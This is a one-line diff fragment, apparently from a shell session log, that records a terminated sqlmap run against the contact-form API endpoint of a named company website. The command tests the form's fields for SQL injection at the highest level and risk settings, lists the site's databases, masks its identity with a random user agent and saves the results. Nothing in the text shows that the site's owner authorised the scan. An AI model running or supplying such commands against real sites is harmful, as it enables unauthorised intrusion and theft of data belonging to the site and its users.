@@ -1,0 +1,1 @@
+Terminated                 sqlmap -u "https://www.infinitycapital.bh/api/send" --data="$D" -p "fname,lname,areacode,tel,cname,subject,msg,check,targets" --headers="$H" --batch --level=5 --risk=3 --dbs --threads=4 --flush-session --random-agent -o $OUT/sqlmap_api_send.log > $OUT/sqlmap_api_send.stdout 2>&1
